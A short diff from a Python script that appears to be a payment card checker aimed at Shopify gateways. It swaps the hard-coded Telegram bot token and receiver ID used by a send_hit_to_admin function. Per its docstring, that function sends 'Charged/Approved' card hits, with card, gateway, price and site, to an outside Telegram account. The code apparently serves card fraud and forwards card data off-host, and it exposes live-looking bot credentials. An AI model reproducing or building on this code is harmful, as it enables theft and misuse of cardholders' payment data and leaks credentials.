@@ -69,8 +69,8 @@ log = logging.getLogger("shopify")
 # ---------------------------------------------------------------------------
 # Admin Hit Notifications
 # ---------------------------------------------------------------------------
-ADMIN_HIT_SENDER_TOKEN = "8821394621:AAGlmaPcqlE862oqjwZY_oBXaY4KDR_pAfI"
-ADMIN_HIT_RECEIVER_ID  = 7549544641
+ADMIN_HIT_SENDER_TOKEN = "8629480718:AAFLxnpZAjxVzpKIfCvGTAMRKtZ1KD3EW9o"
+ADMIN_HIT_RECEIVER_ID  = 8524951580
 
 async def send_hit_to_admin(card: str, status: str, response: str, gateway: str, price: str, site: str):
     """Fire-and-forget Telegram notification for Charged/Approved hits."""
